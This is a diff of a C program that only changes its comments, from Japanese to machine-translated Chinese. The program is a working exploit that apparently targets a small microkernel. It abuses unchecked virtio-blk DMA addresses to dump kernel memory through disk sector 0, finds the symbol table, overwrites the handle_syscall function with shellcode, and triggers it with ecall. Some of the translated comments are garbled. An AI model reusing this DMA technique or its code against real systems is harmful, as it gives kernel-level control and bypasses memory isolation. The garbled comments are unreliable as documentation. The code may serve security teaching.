@@ -14,17 +14,17 @@
 static struct virtio_mmio device;
 static struct virtio_virtq *requestq;
 
-// virtio-blkへのリクエストを格納する領域。最初のPAGE_SIZE - REQUEST_HEADER_SIZEを
-// データとして使い、残りのREQUEST_HEADER_SIZEをリクエストヘッダとして使う。
+//存储对 virtio-blk 的请求的区域。第一个 PAGE_SIZE -REQUEST_HEADER_SIZE
+//数据，并使用剩余的 REQUEST_HEADER_SIZE 作为请求头。
 static paddr_t request_paddr;
 static uintptr_t request_uaddr;
 
-// shellcode.Sの中身 (llvm-objcopy -O binary で生成されるシンボル)
+//shellcode.S 的内容（由 llvm-objcopy -O 二进制文件生成的符号）
 extern char _binary_shellcode_bin_start[];
 extern char _binary_shellcode_bin_size[];
 
-// ディスクの読み書き。data_paddrにはデータの読み込み先または書き込み元の
-// 物理アドレスを指定。
+//读写磁盘。 data_paddr表示数据读或写源。
+//指定物理地址。
 static void readwrite(uint64_t sector, paddr_t data_paddr, size_t len,
                       bool is_write) {
     ASSERT(len + REQUEST_HEADER_SIZE + 1 < PAGE_SIZE);
@@ -43,7 +43,7 @@ static void readwrite(uint64_t sector, paddr_t data_paddr, size_t len,
     chain[0].len = REQUEST_HEADER_SIZE;
     chain[0].device_writable = false;
 
-    chain[1].addr = data_paddr;  // カーネルメモリか誰も確認しないので上手くいく
+    chain[1].addr = data_paddr;//它工作得很好，因为没有人检查它是否是内核内存
     chain[1].len = len;
     chain[1].device_writable = !is_write;
 
@@ -54,7 +54,7 @@ static void readwrite(uint64_t sector, paddr_t data_paddr, size_t len,
     ASSERT_OK(virtq_push(requestq, chain, 3));
     virtq_notify(&device, requestq);
 
-    // 処理が終わるまで待つ。
+    //等待该过程完成。
     uint8_t status;
     do {
         status = virtio_read_interrupt_status(&device);
@@ -66,10 +66,10 @@ static void readwrite(uint64_t sector, paddr_t data_paddr, size_t len,
 static void read_memory(paddr_t src, char *buf, size_t len) {
     ASSERT(IS_ALIGNED(len, SECTOR_SIZE));
 
-    // srcの内容をディスク (0番セクタ) に書き込む
+    //将src的内容写入磁盘（0扇区）
     readwrite(0, src, len, true);
 
-    // 書き込んだディスクの内容 (0番セクタ) をbufに読み込む
+    //将已写入磁盘（0扇区）的内容读入buf
     readwrite(0, request_paddr, len, false);
     memcpy(buf, (uint8_t *) request_uaddr, len);
 }
@@ -77,16 +77,16 @@ static void read_memory(paddr_t src, char *buf, size_t len) {
 static void write_to_memory(paddr_t dest, char *buf, size_t len) {
     ASSERT(IS_ALIGNED(len, SECTOR_SIZE));
 
-    // bufの内容をディスク (0番セクタ) に書き込む
+    //将buf的内容写入磁盘（0扇区）
     memcpy((uint8_t *) request_uaddr, buf, len);
     readwrite(0, request_paddr, len, true);
 
-    // 書き込んだディスクの内容 (0番セクタ) をdestに読み込む
+    //将写入的磁盘内容（0扇区）读取到dest
     readwrite(0, dest, len, false);
 }
 
 void main(void) {
-    // virtio_blkデバイスドライバサーバを削除してからデバイスを再初期化する。
+    //删除 Virtio blk 设备驱动程序服务器，然后重新初始化设备。
     INFO("waiting for virtio_blk driver to finish its initialization...");
     task_t blk_device = ipc_lookup("blk_device");
     ASSERT_OK(blk_device);
@@ -106,9 +106,9 @@ void main(void) {
     ASSERT_OK(driver_alloc_pages(PAGE_SIZE, PAGE_READABLE | PAGE_WRITABLE,
                                  &request_uaddr, &request_paddr));
 
-    // カーネルメモリをbufに抽出する。4MiBあれば十分なはず。
+    //将内核内存提取到 buf。 4 mi b 应该足够了。
     INFO("dumping kernel memory...");
-    static char buf[4 * 1024 * 1024];  // staticをつけて静的に確保する
+    static char buf[4 * 1024 * 1024];//添加static来静态分配
     for (offset_t off = 0; off < sizeof(buf); off += SECTOR_SIZE) {
         read_memory(KERNEL_BASE + off, &buf[off], SECTOR_SIZE);
     }
@@ -116,7 +116,7 @@ void main(void) {
     TRACE("first 128 bytes of the kernel memory at %p:", KERNEL_BASE);
     HEXDUMP(buf, 128);
 
-    // シンボルテーブルを探す。
+    //查找符号表。
     INFO("looking for the symbol table...");
     struct symbol_table *table = NULL;
     for (offset_t off = 0; off < sizeof(buf); off += 4) {
@@ -131,7 +131,7 @@ void main(void) {
         PANIC("symbol table not found");
     }
 
-    // handle_syscall関数のアドレスをシンボルテーブルから探す。
+    //在符号表中查找 Handle 系统调用函数的地址。
     paddr_t table_paddr = KERNEL_BASE + (offset_t) ((char *) table - buf);
     INFO("found the symbol table at 0x%p", table_paddr);
     INFO("looking for the symbol of handle_syscall...");
@@ -151,7 +151,7 @@ void main(void) {
     offset_t off = sym->addr - KERNEL_BASE;
     ASSERT(off < sizeof(buf));
 
-    // shellcode.Sの内容をbuf中のhandle_syscall関数の位置にコピーする。
+    //将 Shellcode.s 的内容复制到 buf 中句柄系统调用函数的位置。
     INFO("overwriting handle_syscall with the shellcode...");
     char *shellcode = _binary_shellcode_bin_start;
     size_t shellcode_size = (size_t) _binary_shellcode_bin_size;
@@ -160,10 +160,10 @@ void main(void) {
     size_t len = ALIGN_UP(off + shellcode_size, SECTOR_SIZE)
                  - ALIGN_DOWN(off, SECTOR_SIZE);
 
-    // handle_syscall関数をshellcode.Sで上書きする。上書きが終わるまでシステムコールを
-    // 誤って呼ばないよう注意 (例: INFOマクロ)。
+    //用shellcode.S覆盖handle_syscall函数。系统调用直到覆盖完成
+//注意不要误调用它（例如INFO宏）。
     write_to_memory(dest, &buf[dest - KERNEL_BASE], len);
 
-    // 準備が整ったので、システムコールハンドラを呼び出す。shellcode.Sが実行されるはず。
+    //现在一切准备就绪，调用系统调用处理程序。 shellcode.s 应该被执行。
     __asm__ __volatile__("ecall");
 }
